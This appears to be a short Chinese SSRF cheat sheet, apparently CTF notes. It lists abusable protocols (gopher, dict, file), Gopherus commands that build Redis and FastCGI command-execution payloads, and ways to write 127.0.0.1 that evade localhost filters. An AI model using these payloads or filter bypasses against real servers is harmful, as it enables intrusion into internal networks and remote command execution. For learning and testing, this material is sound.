涉及函数

```php
curl_exec() curl_exec函数⽤于执⾏指定的cURL会话。
```

## 涉及协议

| Protocol       | Details                                     | 3                       |
| -------------- | ------------------------------------------- | ----------------------- |
| file://        |
| gopher://      | `gopher://<host>:<port>/<gopher-path>`      |
| dict://        | dict://127.0.0.1:6379 //探测 redis 是否存活 |
| (仅 java) url: | `url?url:=file:/flag%23.html`               | file 和 netdoc 都可以读 |

## gopher

[gopher 协议的利用](https://mp.weixin.qq.com/s/lVzMSXn42SjTPb5EnY8NgA)

如果 redis 有验证用 `gophper-redis-auth.py`

```sh
python2 gopherus.py --exploit fastcgi
参数1： /var/www/html/index.php
参数2cmd: ls
python2 gopherus.py --exploit redis
参数1： php
参数2cmd: ls
```

- 生成的 payload 再次 url 编码,
- encode all special chars (Cyberchef) 再使用

## 127.0.0.1 绕过

```bash
url=http://xxx@127.0.0.1
1②7.0.0.1
127。 0。 0。 1
127.1
0177.0.0.1 //⼋进制
0x7f.0.0.1 //⼗六进制
2130706433 //⼗进制
url=http://0/flag.php
0.0.0.0
```

# Article

[实战 | 利用 SSRF 渗透内网主机-下](https://mp.weixin.qq.com/s/oq7IC6Av4_fY7HBxH-8p0Q)
[实战 | 利用 SSRF 渗透内网主机-中](https://mp.weixin.qq.com/s/bEhNuMJpI5y9fj5RGzYhXA)
[实战 | 利用 SSRF 渗透内网主机-上](https://mp.weixin.qq.com/s/zmOLO3ilJdSl02s6aWLpXw)
